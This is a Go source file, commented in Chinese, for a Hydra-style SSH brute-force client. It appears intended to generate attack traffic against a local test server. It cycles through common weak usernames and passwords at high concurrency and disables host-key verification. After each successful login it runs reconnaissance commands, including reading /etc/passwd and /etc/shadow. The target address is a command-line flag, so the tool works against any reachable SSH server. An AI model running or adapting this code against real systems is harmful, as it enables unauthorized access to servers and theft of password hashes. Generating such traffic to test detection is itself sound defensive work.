// 临时攻击压测工具：hydra 风格的 SSH 高频爆破客户端（构建后即删除，不进入仓库）。
package main

import (
	"flag"
	"fmt"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

var cmds = []string{
	"whoami; id; uname -a",
	"ls -la /; df -h",
	"cat /etc/passwd; cat /etc/shadow",
	"netstat -ant | head -20",
}

func main() {
	addr := flag.String("addr", "127.0.0.1:8222", "目标 SSH 地址")
	workers := flag.Int("workers", 6, "并发协程数")
	total := flag.Int("total", 8000, "认证尝试总次数")
	okEvery := flag.Int("okevery", 10, "每 N 次采用正确凭证（0 表示全部失败）")
	user := flag.String("user", "root", "正确用户名")
	pass := flag.String("pass", "123456", "正确口令")
	flag.Parse()

	badUsers := []string{"root", "admin", "test", "oracle", "ubuntu", "pi"}
	badPass := []string{"123456", "password", "root", "admin123", "P@ssw0rd", "12345678", "toor", "letmein"}

	var okN, failN, errN int64
	var n int64
	start := time.Now()
	var wg sync.WaitGroup
	for w := 0; w < *workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				i := atomic.AddInt64(&n, 1)
				if int(i) > *total {
					return
				}
				success := *okEvery > 0 && i%int64(*okEvery) == 0
				u, p := *user, *pass
				if !success {
					u = badUsers[int(i)%len(badUsers)]
					p = badPass[int(i)%len(badPass)]
					if u == *user && p == *pass {
						p = "wrong-" + p
					}
				}
				cfg := &ssh.ClientConfig{
					User:            u,
					Auth:            []ssh.AuthMethod{ssh.Password(p)},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
					Timeout:         8 * time.Second,
				}
				cli, err := ssh.Dial("tcp", *addr, cfg)
				if err != nil {
					if success {
						atomic.AddInt64(&errN, 1)
					} else {
						atomic.AddInt64(&failN, 1)
					}
					continue
				}
				atomic.AddInt64(&okN, 1)
				if sess, e := cli.NewSession(); e == nil {
					_, _ = sess.CombinedOutput(cmds[int(i)%len(cmds)])
					_ = sess.Close()
				}
				_ = cli.Close()
			}
		}()
	}
	wg.Wait()
	d := time.Since(start)
	fmt.Printf("SSH 攻击完成: 尝试=%d 成功=%d 失败=%d 异常=%d 用时=%.1fs 速率=%.0f 次/秒\n",
		*total, okN, failN, errN, d.Seconds(), float64(*total)/d.Seconds())
}
